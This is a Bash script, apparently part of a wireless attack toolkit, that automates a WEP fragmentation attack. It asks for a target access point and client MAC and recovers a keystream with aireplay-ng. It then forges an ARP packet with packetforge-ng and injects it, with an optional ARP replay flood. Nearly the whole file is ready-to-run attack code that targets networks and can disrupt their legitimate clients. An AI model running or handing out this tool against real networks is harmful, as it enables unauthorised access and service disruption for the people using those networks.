#!/bin/bash

source Attacks/common.sh

# Color & style constants
RED='\033[0;31m'
GREEN='\033[0;32m'
BOLD='\033[1m'
NC='\033[0m'

# Require root privileges
require_root # NU AI NEVOIE STERGE DACA VREI SA MEARGA

# Main menu prompt
prompt_to_continue() {
    local options=("Start fragmentation attack")

    echo
    echo -e "${GREEN}==============================================${NC}"
    echo -e "${BOLD}${GREEN}            Fragmentation Attack        ${NC}${BOLD}${NC}"
    echo -e "${GREEN}==============================================${NC}"
    sleep 0.5
    echo
    echo -e "${RED}[!]${NC} Some APs detect and block fragment injection."
    echo -e "${RED}[!]${NC} High packet injection can disrupt legitimate clients."

    echo
    echo -e "${GREEN}[*]${NC} Available options:"
    echo
    for i in "${!options[@]}"; do
        echo -e "  ${GREEN}[$((i+1))]${NC} ${options[$i]}"
        sleep 0.1
    done
    echo -e "  ${GREEN}[0]${NC} Go back"
    echo

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Choose an option:") " opt
        case "$opt" in
            1) break ;;  # proceed
            0) go_back ;;  # back
            *) echo -e "${RED}[!]${NC} Invalid. Choose 0 or 1."; sleep 0.3 ;;
        esac
    done
}

frag_attack() {
    clear 

    echo -e "${GREEN}[*]${NC} Enter details for the fragmentation attack:"

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Target BSSID (MAC format): ")" bssid
        if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid MAC address."
            sleep 0.3
        fi
    done
    echo -e "${GREEN}[✓]${NC} BSSID set: $bssid"

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Client MAC :") " client
        [[ "$client" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && break
        echo -e "${RED}[!]${NC} Invalid MAC."; sleep 0.3
    done
    echo -e "${GREEN}[✓]${NC} Client set: $client"


    read -p "$(echo -e "${GREEN}[*]${NC} Press Enter to start the fragmentation attack...")"

    local LOGFILE
    LOGFILE=$(mktemp /tmp/fraglog.XXXXXX)

    gnome-terminal -- bash -c "sudo aireplay-ng -5 -b '$bssid' -h '$client' '$MONITOR_INTERFACE' 2>&1 | tee '$LOGFILE'; exit" &

    # Wait for output markers
    echo -e "${GREEN}[*]${NC} Waiting for fragmentation to complete..."
    while ! grep -q 'Saving chosen packet in' "$LOGFILE" || ! grep -q 'Saving keystream in' "$LOGFILE"; do
        sleep 1
    done

    # Extract filenames
    local REPLAY_FILE
    local XOR_FILE
    REPLAY_FILE=$(grep -oP 'Saving chosen packet in \K\S+' "$LOGFILE")
    XOR_FILE=$(grep -oP 'Saving keystream in \K\S+' "$LOGFILE")

    echo -e "${GREEN}[✓]${NC} Replay packet: ${BOLD}$REPLAY_FILE${NC}"
    sleep 0.3
    echo -e "${GREEN}[✓]${NC} Keystream file: ${BOLD}$XOR_FILE${NC}"
    sleep 0.3

    # Clean up temporary log
    rm -f "$LOGFILE"

    # Parse IP addresses from the replay capture
    echo -e "${GREEN}[*]${NC} Parsing IPs from ${BOLD}${REPLAY_FILE}${NC}..."
    sleep 1.3
    line=$(tcpdump -s 0 -n -e -r "$REPLAY_FILE" 2>/dev/null | grep '>' | head -n1)
    ips=( $(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}') )

    STATION_IP=${ips[0]:-255.255.255.255}
    AP_IP=${ips[1]:-255.255.255.255}

    echo -e "${GREEN}[✓]${NC} Station IP: ${BOLD}$STATION_IP${NC}"
    sleep 0.3
    echo -e "${GREEN}[✓]${NC} AP IP: ${BOLD}$AP_IP${NC}"
    sleep 0.3


    # Forge ARP packet
    read -rp "$(echo -e "${GREEN}[*]${NC} Enter a name for the forged packet (without extension):") " forged_name
    forged_name="${forged_name}.cap"
    sleep .05
    echo -e "${GREEN}[*]${NC} Forging ARP packet with packetforge-ng..."
    sleep 0.3

    packetforge-ng -0 -a "$bssid" -h "$client" -k "$AP_IP" -l "$STATION_IP" -y "$XOR_FILE" -w "Attacks/$forged_name" > /dev/null 2>&1
    sleep 0.3

    echo -e "${GREEN}[✓]${NC} Forged packet saved as ${BOLD}Attacks/$forged_name${NC}"
    sleep 0.3

    read -rp "$(echo -e "${GREEN}[*]${NC} Press Enter to start attack.") "
    sleep 0.3

    gnome-terminal -- bash -c "sudo aireplay-ng -2 -r \"Attacks/$forged_name\" -h \"$client\" \"$MONITOR_INTERFACE\"; exec bash" &
    sleep 1.3

    while true; do
        read -rp "$(echo -e "${GREEN}[?]${NC} Do you want to start a ARP replay attack to speed up the process? (yes/no): ") " arp_option
        if [[ "$arp_option" == "yes" ]]; then
            echo -e "${GREEN}[*]${NC} Launching ARP request replay attack to accelerate process..."
            sleep 1.3
            gnome-terminal -- bash -c "sudo aireplay-ng -3 -b \"$bssid\" -h \"$client\" \"$MONITOR_INTERFACE\"; exec bash" &
            break
        elif [[ "$arp_option" == "no" ]]; then
            echo -e "${GREEN}[*]${NC} ARP replay attack skipped."
            sleep 1.3
            break
        else
            echo -e "${RED}[!]${NC} Invalid option. Please enter (yes/no)."
        fi
    done

    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Type 'stop' to stop the process: ")" user_input
        if [[ "$user_input" == "stop" ]]; then
            break
        else
            echo -e "${RED}[!]${NC} Invalid input. Please type 'stop' to stop the command."
        fi
    done

    sleep 1.3

    if [[ "$arp_option" == "yes" ]]; then
        sudo pkill -f aireplay-ng
    fi

    sudo pkill -f aireplay-ng

    echo -e "${GREEN}[✓]${NC} Attack complete."; sleep 0.5
}

# Repeat or go back (stop capture then menu)
after_attack_options() {
    echo
    echo -e "  ${GREEN}[1]${NC} New fragmentation attack"
    echo -e "  ${GREEN}[0]${NC} Go back to main menu"
    echo
    while true; do
        read -rp "$(echo -e "${GREEN}[*]${NC} Choose an option:") " o
        case "$o" in
            1) clear; arp_attack; after_attack_options; break ;;  
            0) ask_stop_capture; go_back ;;
            *) echo -e "${RED}[!]${NC} Type 0 or 1."; sleep 0.3
        esac
    done
}

# Entry point
main() {
    clear
    prompt_to_continue
    check_monitor_interfaces
    ask_capture_choice 
    frag_attack
    after_attack_options
}

main
